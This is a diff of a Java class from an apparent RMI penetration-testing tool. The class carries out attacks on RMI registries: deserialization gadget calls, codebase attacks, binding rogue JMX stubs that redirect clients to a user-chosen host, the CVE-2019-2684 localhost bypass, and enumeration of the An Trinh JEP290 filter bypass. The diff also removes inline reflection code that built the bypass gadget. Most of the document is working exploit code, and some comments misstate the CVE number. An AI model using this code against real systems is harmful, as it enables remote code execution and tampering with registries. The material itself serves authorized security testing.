@@ -1,35 +1,38 @@
 package de.qtc.rmg.operations;
 
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Proxy;
 import java.rmi.server.ObjID;
-import java.rmi.server.RMIClientSocketFactory;
-import java.rmi.server.RMIServerSocketFactory;
-import java.rmi.server.RemoteObjectInvocationHandler;
-import java.rmi.server.RemoteRef;
-import java.rmi.server.UnicastRemoteObject;
 
 import javax.management.remote.rmi.RMIServerImpl_Stub;
 
 import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.MaliciousOutputStream;
-import de.qtc.rmg.networking.DummySocketFactory;
-import de.qtc.rmg.utils.RMGUtils;
-import de.qtc.rmg.utils.RMIWhisperer;
+import de.qtc.rmg.networking.RMIWhisperer;
+import de.qtc.rmg.utils.YsoIntegration;
 import sun.rmi.server.UnicastRef;
-import sun.rmi.transport.Endpoint;
 import sun.rmi.transport.LiveRef;
-import sun.rmi.transport.StreamRemoteCall;
 import sun.rmi.transport.tcp.TCPEndpoint;
 
 
 /**
- * The RegistryClient class provides different methods to communicate with an RMI registry. The supported RMI
- * calls are dispatched manually, which allows modifications on the call level. The RMI target is taken from the
- * supplied RMIWhisperer, which allows to skip all the TLS and host redirection stuff.
+ * The RMI registry is a well known RMI object with publicly known method definitions. Loosely spoken, it can
+ * be compared to DNS, as it maps bound names to available RemoteObjects. RMI servers use the exposed remote
+ * methods bind, rebind and unbind to create, change or delete entries within the registry. Clients use the
+ * list and lookup calls to list the available bound names and to obtain RemoteObjects.
+ *
+ * As the registry exposes well known remote methods, it can be used for deserialization and codebase attacks.
+ * With JEP290, serialization filters were implemented for the RMI registry, but the filters were not that strict
+ * as for the DGC. Since the registry is a more complex service than the DGC, it is necessary to define a wider
+ * range of accepted classes, which lead to filter bypasses in the past. Concerning codebase attacks, the registry
+ * uses a SecurityManager that allows outbound connections by default. If an RMI registry is run with useCodebaseOnly
+ * set to false, classes should always be loadable from a remote endpoint. However, what can be done from there
+ * depends on the situation.
+ *
+ * Using the bind, rebind and unbind methods of the registry is usually only allowed from localhost. However,
+ * this restriction is not present in some cases and in others it may be bypassed using CVE-2019-2684.
+ *
+ * This class lets you perform all the above mentioned techniques and includes enumeration methods to identify
+ * vulnerable endpoints automatically.
  *
  * @author Tobias Neitzel (@qtc_de)
  */
@@ -37,34 +40,28 @@ import sun.rmi.transport.tcp.TCPEndpoint;
 public class RegistryClient {
 
     private RMIWhisperer rmi;
-    private Field enableReplaceField;
 
     private static final long interfaceHash = 4905912898345647071L;
-    private static final String[] callNames = new String[] {"bind", "list", "lookup", "rebind", "unbind"};
-    private static final long[] hashCodes = new long[] {7583982177005850366L, 2571371476350237748L, -7538657168040752697L, -8381844669958460146L, 7305022919901907578L };
+    private static final ObjID objID = new ObjID(ObjID.REGISTRY_ID);
 
-    /**
-     * Initializes the class and makes some required fields accessible by using reflection. These fields are
-     * actually only required by some of the provided functions and the reflection is contained within the constructor
-     * for legacy reasons. However, it shouldn't hurt.
-     *
-     * @param rmiRegistry RMIWhisperer object that represents the targeted RMI registry
-     */
-    public RegistryClient(RMIWhisperer rmiRegistry)
+
+    public RegistryClient(RMIWhisperer rmiEndpoint)
     {
-        this.rmi = rmiRegistry;
-
-        try {
-            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
-            enableReplaceField.setAccessible(true);
-
-        } catch(SecurityException | NoSuchFieldException e) {
-            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
-        }
+        this.rmi = rmiEndpoint;
     }
 
+    /**
+     * Invokes the bind method on the RMI endpoint. The used bound name can be specified by the user,
+     * but the bound RemoteObject is always an instance of RMIServerImpl_Stub. This is the default class
+     * that is used by JMX and should therefore be available on most RMI servers. Furthermore, JMX is
+     * a common RMI technology and binding this stub is probably most useful. The bind operation can also
+     * be performed using CVE-2019-268, which may allows bind access from remote hosts.
+     *
+     * @param boundName the bound name that will be bound on the registry
+     * @param host the host that is referenced by the bound RemoteObject. Clients will connect here
+     * @param port the port that is referenced by the bound RemoteObejct. Clients will connect here
+     * @param localhostBypass whether to use CVE-2019-268 for the bind operation
+     */
     public void bindObject(String boundName, String host, int port, boolean localhostBypass)
     {
         Logger.printMixedBlue("Binding name", boundName, "to TCPEndpoint ");
@@ -75,19 +72,20 @@ public class RegistryClient {
         Object payloadObject = null;
 
         try {
-            payloadObject = generateRMIServerImpl(host, port);
+            payloadObject = prepareRMIServerImpl(host, port);
+
         } catch(Exception e) {
             ExceptionHandler.internalException(e, "RegistryClient.bindObject", true);
         }
 
         try {
-            bindCall(boundName, payloadObject, false, localhostBypass);
+            registryCall("bind", new Object[] {boundName, payloadObject}, false, localhostBypass);
             Logger.printlnMixedBlue("Encountered", "no Exception", "during bind call.");
             Logger.printlnMixedYellow("Bind operation", "was probably successful.");
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
+            Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 ExceptionHandler.nonLocalhost(e, "bind", localhostBypass);
@@ -115,6 +113,18 @@ public class RegistryClient {
         }
     }
 
+    /**
+     * Invokes the rebind method on the RMI endpoint. The used bound name can be specified by the user,
+     * but the bound RemoteObject is always an instance of RMIServerImpl_Stub. This is the default class
+     * that is used by JMX and should therefore be available on most RMI servers. Furthermore, JMX is
+     * a common RMI technology and binding this stub is probably most useful. The rebind operation can also
+     * be performed using CVE-2019-268, which may allows bind access from remote hosts.
+     *
+     * @param boundName the bound name that will be rebound on the registry
+     * @param host the host that is referenced by the rebound RemoteObject. Clients will connect here
+     * @param port the port that is referenced by the rebound RemoteObejct. Clients will connect here
+     * @param localhostBypass whether to use CVE-2019-268 for the rebind operation
+     */
     public void rebindObject(String boundName, String host, int port, boolean localhostBypass)
     {
         Logger.printMixedBlue("Rebinding name", boundName, "to TCPEndpoint ");
@@ -125,20 +135,20 @@ public class RegistryClient {
         Object payloadObject = null;
 
         try {
-            payloadObject = generateRMIServerImpl(host, port);
+            payloadObject = prepareRMIServerImpl(host, port);
 
         } catch(Exception e) {
             ExceptionHandler.internalException(e, "RegistryClient.rebindObject", true);
         }
 
         try {
-            rebindCall(boundName, payloadObject, false, localhostBypass);
+            registryCall("rebind", new Object[] {boundName, payloadObject}, false, localhostBypass);
             Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
             Logger.printlnMixedYellow("Rebind operation", "was probably successful.");
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
+            Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 ExceptionHandler.nonLocalhost(e, "rebind", localhostBypass);
@@ -160,6 +170,13 @@ public class RegistryClient {
         }
     }
 
+    /**
+     * Invokes the unbind method on the RMI endpoint. If successful, the specified bound name should
+     * disappear from the registry.
+     *
+     * @param boundName the bound name that will be deleted from the registry
+     * @param localhostBypass whether to use CVE-2019-268 for the unbind operation
+     */
     public void unbindObject(String boundName, boolean localhostBypass)
     {
         Logger.printlnMixedBlue("Ubinding bound name", boundName, "from the registry.");
@@ -167,13 +184,13 @@ public class RegistryClient {
         Logger.increaseIndent();
 
         try {
-            unbindCall(boundName, false, localhostBypass);
+            registryCall("unbind", new Object[] {boundName}, false, localhostBypass);
             Logger.printlnMixedBlue("Encountered", "no Exception", "during unbind call.");
             Logger.printlnMixedYellow("Unbind operation", "was probably successful.");
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
+            Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 ExceptionHandler.nonLocalhost(e, "unbind", localhostBypass);
@@ -195,16 +212,27 @@ public class RegistryClient {
     }
 
     /**
-     * Invokes the .lookup(String name) method of the RMI registry with a malformed codebase address and an
-     * Integer as argument. Registry servers that use readObject() for unmarshalling the String type and that
-     * are configured with useCodebaseOnly=false will attempt to parse the provided codebase as URL and throw
-     * an according exception. With useCodebaseOnly=true, the malformed codebase is read too, but ignored afterwards.
-     * This allows to detect whether the server runs with useCodebaseOnly=false.
+     * Attempts to determine the setting of useCodebaseOnly. This is done by sending an Integer object during a
+     * RMI call, that is annotated with a malformed location URL. When RMI servers call readObject, the corresponding
+     * MarshalInputStream always tries to obtain the location of the object. In case of useCodebaseOnly=true, the location
+     * is then simply ignored afterwards. However, when useCodebaseOnly is set to false, the location is used to construct
+     * a URLClassLoader, which throws an exception on encountering an invalid URL.
      *
-     * @param marshal  indicates whether the registry server uses readObject() to unmarshall Strings (true)
-     * @param regMethod  the registry method to use for the operation (lookup|bind|rebind|unbind)
+     * The problem is, that the only registry method that can be invoked from remote and accepts arguments is the lookup
+     * method. This one is also used by default during the operation, but it has the downside of expecting a String as
+     * argument. In mid 2020, there was a RMI patch that changed the behavior how RMI servers unmarshal the String type.
+     * A patched server does no longer use readObject to unmarshal String values and the class annotation is always
+     * ignored. This makes this enumeration technique non functional for most recent RMI servers.
+     *
+     * When scanning an RMI registry on localhost, the user can use --reg-method to use a different registry method (e.g. bind)
+     * for the operation. Furthermore, using --localhost-bypass may allows using other registry methods also from
+     * remote.
+     *
+     * @param marshal indicates whether the registry server uses readObject() to unmarshal Strings (true)
+     * @param regMethod the registry method to use for the operation (lookup|bind|rebind|unbind)
+     * @param localhostBypass whether to use CVE-2019-268 for the operation
      */
-    public void enumCodebase(boolean marshal, String regMethod, boolean localHostBypass)
+    public void enumCodebase(boolean marshal, String regMethod, boolean localhostBypass)
     {
         Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
         Logger.println("");
@@ -221,29 +249,29 @@ public class RegistryClient {
 
         try {
 
-            callByName(regMethod, 0, true, localHostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, 0), true, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
+            Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.net.MalformedURLException ) {
                 Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + regMethod + " call.");
                 Logger.printMixedBlue("  --> The server", "attempted to parse", "the provided codebase ");
                 Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                 Logger.statusNonDefault();
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
 
             } else if( t instanceof java.lang.ClassCastException ) {
                 Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
                 Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
                 Logger.printlnPlainYellow("(useCodebaseOnly=true).");
                 Logger.statusDefault();
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
 
             } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 Logger.eprintlnMixedYellow("Unable to enumerate useCodebaseOnly by using", regMethod, "call.");
-                ExceptionHandler.nonLocalhost(e, regMethod, localHostBypass);
+                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);
 
             } else {
                 ExceptionHandler.unexpectedException(e, regMethod, "call", false);
@@ -254,7 +282,7 @@ public class RegistryClient {
             Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
             Logger.printlnPlainYellow("(useCodebaseOnly=true).");
             Logger.statusDefault();
-            RMGUtils.showStackTrace(e);
+            ExceptionHandler.showStackTrace(e);
 
         } catch( Exception e ) {
             ExceptionHandler.unexpectedException(e, regMethod, "call", false);
@@ -266,11 +294,15 @@ public class RegistryClient {
     }
 
     /**
-     * Determines how the String type is umarshalled by the remote server. Sends a java.lang.Integer as argument
-     * for the lookup(String name) call. If the String type is read via readObject(), this will lead to an deserialization
-     * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
-     * appears in the server exception, we know that readObject() was used. The readString() method, on the other hand,
-     * ignores the location of an object.
+     * Determines the String unmarshalling behavior of the RMI server. This function abuses the fact that the registry
+     * method lookup expects a String as argument. It attempts to invoke the lookup method using an Integer object instead,
+     * that is annotated with an invalid URL as codebase.
+     *
+     * When an RMI registry unmarshalls String via readObject, it will attempt to parse the client specified codebase and
+     * throw an MalformedURLException. Otherwise, if Strings are unmarshalled via readString, the codebase is just ignored
+     * and a ClassCastException should occur.
+     *
+     * @return true if the server uses readObject to unmarshal String
      */
     public boolean enumerateStringMarshalling()
     {
@@ -281,17 +313,19 @@ public class RegistryClient {
         Logger.increaseIndent();
 
         try {
-            lookupCall(0, true);
+            MaliciousOutputStream.setDefaultLocation("InvalidURL");
+            registryCall("lookup", new Object[] {0}, true, false);
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
-            if( t instanceof ClassNotFoundException && t.getMessage().contains("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
-                Logger.printlnMixedYellow("- Server", "attempted to deserialize", "object locations during lookup call.");
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if( t instanceof java.net.MalformedURLException ) {
+                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during lookup call.");
                 Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                 Logger.printlnPlainYellow("readObject().");
                 Logger.statusOutdated();
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
                 marshal = true;
 
             } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
@@ -299,15 +333,28 @@ public class RegistryClient {
                 Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                 Logger.printlnPlainYellow("readString().");
                 Logger.statusDefault();
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
 
             } else if( t instanceof java.io.InvalidClassException ) {
                 Logger.printMixedBlue("- Server rejected deserialization of", "java.lang.Integer");
                 Logger.printlnPlainYellow(" (SingleEntryRegistry?).");
                 Logger.println("  --> Unable to detect String marshalling on this registry type.");
                 Logger.statusUndecided("Configuration");
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
 
+            } else {
+                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
+            }
+
+        } catch( ClassCastException e ) {
+
+            if( e.getMessage().contains("java.lang.Integer cannot be cast to java.lang.String") ) {
+                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during lookup call.");
+                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
+                Logger.printlnPlainYellow("readObject().");
+                Logger.statusOutdated();
+                ExceptionHandler.showStackTrace(e);
+                marshal = true;
             } else {
                 ExceptionHandler.unexpectedException(e, "lookup", "call", false);
             }
@@ -322,23 +369,31 @@ public class RegistryClient {
         return marshal;
     }
 
+    /**
+     * Enumerates whether the server is vulnerable to CVE-2019-268. To check this, the localhost bypass is performed
+     * on the unbind operation, with an definitely non existing bound name as argument. If the server is vulnerable,
+     * it will try to remove the bound name but throw an NotBoundException, as the bound name does not exist. If non
+     * vulnerable, an AccessException should occur.
+     */
     public void enumLocalhostBypass()
     {
         Logger.printlnBlue("RMI registry localhost bypass enumeration (CVE-2019-2684):");
         Logger.println("");
         Logger.increaseIndent();
 
+        Object[] payload = new Object[] {"If this name exists on the registry, it is definitely the maintainers fault..."};
+
         try {
-            unbindCall("If this name exists on the registry, it is definitely the maintainers fault...", false, true);
+            registryCall("unbind", payload, false, true);
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
+            Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 Logger.eprintlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
                 Logger.statusOk();
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
 
             } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                 ExceptionHandler.singleEntryRegistry(e, "unbind");
@@ -351,7 +406,7 @@ public class RegistryClient {
             Logger.printMixedYellow("- Caught", "NotBoundException", "during unbind call ");
             Logger.printlnPlainBlue("(unbind was accepeted).");
             Logger.statusVulnerable();
-            RMGUtils.showStackTrace(e);
+            ExceptionHandler.showStackTrace(e);
 
         } catch( Exception e  ) {
             ExceptionHandler.unexpectedException(e, "unbind", "call", false);
@@ -361,6 +416,19 @@ public class RegistryClient {
         }
     }
 
+    /**
+     * Determines whether the server is vulnerable to known RMI registry whitelist bypasses. The method uses the
+     * currently most recent bypass technique (https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
+     * which causes an outbound JRMP connection on success. To avoid a real outgoing connection, the function
+     * invokes the bypass with an invalid port value of 1234567.
+     *
+     * If the bypass is successful, the invalid port number should cause an IllegalArgumentException. A patched server
+     * should answer with a RemoteException instead.
+     *
+     * @param regMethod registry method to use for the call
+     * @param localhostBypass whether to use CVE-2019-268 for the operation
+     * @param marshal whether or not the server used readObject to unmarshal String
+     */
     public void enumJEP290Bypass(String regMethod, boolean localhostBypass, boolean marshal)
     {
         Logger.printlnBlue("RMI registry JEP290 bypass enmeration:");
@@ -377,17 +445,17 @@ public class RegistryClient {
         }
 
         try {
-            payloadObject = generateBypassObject("127.0.0.1", 1234567);
+            payloadObject = YsoIntegration.prepareAnTrinhGadget("127.0.0.1", 1234567);
         } catch(Exception e) {
             ExceptionHandler.unexpectedException(e, "pyload", "creation", true);
         }
 
         try {
-            callByName(regMethod, payloadObject, false, localhostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable t = RMGUtils.getCause(e);
+            Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);
@@ -398,7 +466,7 @@ public class RegistryClient {
             } else if( t instanceof java.rmi.RemoteException ) {
                 Logger.printMixedYellow("- Caught", "RemoteException", "after sending An Trinh gadget ");
                 Logger.printlnPlainYellow("(An Trinh bypass patched).");
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
                 Logger.statusOk();
 
             } else {
@@ -408,7 +476,7 @@ public class RegistryClient {
         } catch( java.lang.IllegalArgumentException e ) {
             Logger.printlnMixedYellow("- Caught", "IllegalArgumentException", "after sending An Trinh gadget.");
             Logger.statusVulnerable();
-            RMGUtils.showStackTrace(e);
+            ExceptionHandler.showStackTrace(e);
 
         } catch( Exception e  ) {
             ExceptionHandler.unexpectedException(e, regMethod, "call", false);
@@ -418,20 +486,24 @@ public class RegistryClient {
         }
     }
 
-    public void gadgetCall(Object payloadObject, String regMethod, boolean localHostBypass)
+    /**
+     * Invokes the specified registry method with a user defined payload object.
+     *
+     * @param payloadObject object to use for the call. Most of the time a ysoserial gadget
+     * @param regMethod registry method to use for the call
+     * @param localhostBypass whether to use CVE-2019-268 for the operation
+     */
+    public void gadgetCall(Object payloadObject, String regMethod, boolean localhostBypass)
     {
-        Logger.println("");
-        Logger.printlnBlue("Attempting deserialization attack on RMI registry endpoint...");
-        Logger.println("");
-        Logger.increaseIndent();
+        Logger.printGadgetCallIntro("RMI Registry");
 
         try {
 
-            callByName(regMethod, payloadObject, false, localHostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable cause = RMGUtils.getCause(e);
+            Throwable cause = ExceptionHandler.getCause(e);
 
             if( cause instanceof java.io.InvalidClassException ) {
                 ExceptionHandler.jep290(e);
@@ -459,29 +531,30 @@ public class RegistryClient {
         }
     }
 
-    public void codebaseCall(Object payloadObject, String regMethod, boolean localHostBypass)
+    /**
+     * Invokes the specified registry method with a user defined payload object, annotated with a user defined codebase.
+     * The codebase annotation is implemented in the MaliciousOutputStream class and setup within the ArgumentParser.
+     *
+     * @param payloadObject object to use for the call
+     * @param regMethod registry method to use for the call
+     * @param localhostBypass whether to use CVE-2019-268 for the operation
+     */
+    public void codebaseCall(Object payloadObject, String regMethod, boolean localhostBypass)
     {
         String className = payloadObject.getClass().getName();
-
-        Logger.printlnBlue("Attempting codebase attack on RMI registry endpoint...");
-        Logger.print("Using class ");
-        Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
-        Logger.printlnPlainMixedYellow(" during", regMethod, "call.");
-        Logger.println("");
-        Logger.increaseIndent();
+        Logger.printCodebaseAttackIntro("RMI Registry", regMethod, className);
 
         try {
-
-            callByName(regMethod, payloadObject, false, localHostBypass, "");
+            registryCall(regMethod, packArgsByName(regMethod, payloadObject), true, localhostBypass);
 
         } catch( java.rmi.ServerException e ) {
 
-            Throwable cause = RMGUtils.getCause(e);
+            Throwable cause = ExceptionHandler.getCause(e);
 
             if( cause instanceof java.io.InvalidClassException ) {
                 ExceptionHandler.invalidClass(e, "Registry", className);
                 Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
-                RMGUtils.showStackTrace(e);
+                ExceptionHandler.showStackTrace(e);
 
             } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                 ExceptionHandler.unsupportedClassVersion(e, regMethod, "call");
@@ -510,38 +583,107 @@ public class RegistryClient {
         }
     }
 
-    /*
-    * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
-    * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
-    * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
-    *
-    * @param host  listener address for the outgoing JRMP connection
-    * @param port  listener port for the outgoing JRMP connection
-    * @param regMethod  registry Method to use for the call
-    */
-    public static Object generateBypassObject(String host, int port) throws Exception
+    /**
+     * Invoke a remote method on a RMI registry. Depending on the selected option for the localhost bypass, the function
+     * uses the new RMI calling convention (localhost bypass = true) or the old calling convention (localhost bypass = false).
+     * The default RMI API always uses the old calling convention, which lead to the bug initially.
+     *
+     * @param callName registry method to use for the call
+     * @param callArguments argument array to use for the call
+     * @param maliciousStream whether or not to use the MaliciousOutputStream for customized class annotations
+     * @param bypass whether to use CVE-2019-268 for the operation
+     * @throws Exception connection related exceptions are caught, but anything other is thrown
+     */
+    private void registryCall(String callName, Object[] callArguments, boolean maliciousStream, boolean bypass) throws Exception
     {
-        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
-        constructor.setAccessible(true);
+        if(bypass)
+            rmi.genericCall(objID, -1, getHashByName(callName), callArguments, maliciousStream, callName);
+        else
+            rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);
+    }
 
-        Field ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
-        ssfField.setAccessible(true);
+    /**
+     * Helper function that maps call names to callIDs. The legacy RMI calling convention (that is used by default for registry
+     * operations) requires method calls to be made using an interfaceHash and callIDs. This function can be used to obtain the
+     * correct callID for the specified method.
+     *
+     * @param callName registry method to obtain the callID for
+     * @return callID of the specified registry method
+     */
+    private int getCallByName(String callName)
+    {
+        switch(callName) {
+            case "bind":
+                return 0;
+            case "list":
+                return 1;
+            case "lookup":
+                return 2;
+            case "rebind":
+                return 3;
+            case "unbind":
+                return 4;
+            default:
+                ExceptionHandler.internalError("RegistryClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
+        }
 
-        TCPEndpoint endpoint = new TCPEndpoint(host, port);
-        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
+        return 0;
+    }
 
-        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
-        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
-            RMIServerSocketFactory.class.getClassLoader(),
-            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
-            payloadInvocationHandler);
+    /**
+     * When calling registry methods with the new RMI calling convention, a method hash is required for each remote method.
+     * This function maps call names to their correspondign method hash.
+     *
+     * @param callName registry method to obtain the methodHash for
+     * @return methodHash of the specified registry method
+     */
+    private long getHashByName(String callName)
+    {
+        switch(callName) {
+            case "bind":
+                return 7583982177005850366L;
+            case "list":
+                return 2571371476350237748L;
+            case "lookup":
+                return -7538657168040752697L;
+            case "rebind":
+                return -8381844669958460146L;
+            case "unbind":
+                return 7305022919901907578L;
+            default:
+                ExceptionHandler.internalError("RegistryClient.getMethodHashByName", "Unable to find method hash for method '" + callName + "'.");
+        }
 
-        UnicastRemoteObject payloadObject = null;
-        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
-        UnicastRemoteObject.unexportObject(payloadObject, true);
+        return 0L;
+    }
 
-        ssfField.set(payloadObject, proxySSF);
-        return payloadObject;
+    /**
+     * Depending on the selected RMI registry call, one needs a different set of input arguments. This helper function
+     * allows to generate the corresponding set of arguments depending on the call name. It expects the user to specify
+     * a payload object that will be used for one of the required arguments.
+     *
+     * @param callName registry method to generate the argument array for
+     * @param payloadObject payload object to include into the argument array
+     * @return argument array that can be used for the specified registry call
+     */
+    private Object[] packArgsByName(String callName, Object payloadObject)
+    {
+        switch(callName) {
+            case "bind":
+                return new Object[] {"rmg", payloadObject};
+            case "list":
+                return new Object[] {};
+            case "lookup":
+                return new Object[] {payloadObject};
+            case "rebind":
+                return new Object[] {"rmg", payloadObject};
+            case "unbind":
+                return new Object[] {payloadObject};
+            default:
+                ExceptionHandler.internalError("RegistryClient.packArgsByName", "Unable to find pack strategie for method '" + callName + "'.");
+        }
+
+        return null;
     }
 
     /**
@@ -549,155 +691,14 @@ public class RegistryClient {
      * points to a user controlled address. This can be used for binding a malicious bound name to the
      * RMI registry. Once it is looked up, a JRMP connection is created to the specified TCPEndpoint.
      *
-     * @param host  listener host for the outgoing JRMP connection
-     * @param port  listener port for the outgoing JRMP connection
-     * @return   RMIServerImpl_Stub as used by JMX
-     * @throws Exception
+     * @param host listener host for the outgoing JRMP connection
+     * @param port listener port for the outgoing JRMP connection
+     * @return RMIServerImpl_Stub object as used by JMX
      */
-    public Object generateRMIServerImpl(String host, int port) throws Exception
+    private Object prepareRMIServerImpl(String host, int port)
     {
         TCPEndpoint endpoint = new TCPEndpoint(host, port);
-        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
+        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(), endpoint, false));
         return new RMIServerImpl_Stub(refObject);
-    }
-
-    public void callByName(String callName, Object payloadObject, boolean maliciousStream, boolean bypass, String boundName) throws Exception
-    {
-        switch(callName) {
-
-            case "lookup":
-                lookupCall(payloadObject, maliciousStream);
-                break;
-
-            case "bind":
-                bindCall(boundName, payloadObject, maliciousStream, bypass);
-                break;
-
-            case "rebind":
-                rebindCall(boundName, payloadObject, maliciousStream, bypass);
-                break;
-
-            case "unbind":
-                unbindCall(payloadObject, maliciousStream, bypass);
-                break;
-
-            default:
-                ExceptionHandler.internalError("RegistryClient.callByName", "The function was called with an unknown callname");
-        }
-    }
-
-    private void bindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
-    {
-        Object[] callArguments = new Object[] {boundName, payloadObject};
-        if(bypass)
-            genericCall(-1, callArguments, maliciousStream, "bind");
-        else
-            genericCall(0, callArguments, maliciousStream);
-    }
-
-    private void lookupCall(Object payloadObject, boolean maliciousStream) throws Exception
-    {
-        Object[] callArguments = new Object[] {payloadObject};
-        genericCall(2, callArguments, maliciousStream);
-    }
-
-    private void rebindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
-    {
-        Object[] callArguments = new Object[] {boundName, payloadObject};
-        if(bypass)
-            genericCall(-1, callArguments, maliciousStream, "rebind");
-        else
-            genericCall(3, callArguments, maliciousStream);
-    }
-
-    private void unbindCall(Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
-    {
-        Object[] callArguments = new Object[] {payloadObject};
-        if(bypass)
-            genericCall(-1, callArguments, maliciousStream, "unbind");
-        else
-            genericCall(4, callArguments, maliciousStream);
-    }
-
-    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream) throws Exception
-    {
-        genericCall(callID, callArguments, maliciousStream, null);
-    }
-
-    @SuppressWarnings("deprecation")
-    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream, String callName) throws Exception
-    {
-        long hash = interfaceHash;
-
-        if(callID >= 0) {
-            callName = callNames[callID];
-
-        } else if(callName != null){
-
-            for(int ctr = 0; ctr < callNames.length; ctr++) {
-                if( callName.equals(callNames[ctr]) ) {
-                    hash = hashCodes[ctr];
-                    break;
-                }
-            }
-
-            if( hash == interfaceHash ) {
-                ExceptionHandler.internalError("RegistryClient.genericCall", "Unable to find method hash for method '" + callName + "'.");
-            }
-
-        } else {
-            ExceptionHandler.internalError("RegistryClient.genericCall", "Violation in the calling convention of the function.");
-        }
-
-        try {
-            Endpoint endpoint = rmi.getEndpoint();
-            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));
-
-            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, hash);
-            try {
-                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
-                enableReplaceField.set(out, false);
-
-                if(maliciousStream)
-                    out = new MaliciousOutputStream(out);
-
-                for(Object o : callArguments)
-                    out.writeObject(o);
-
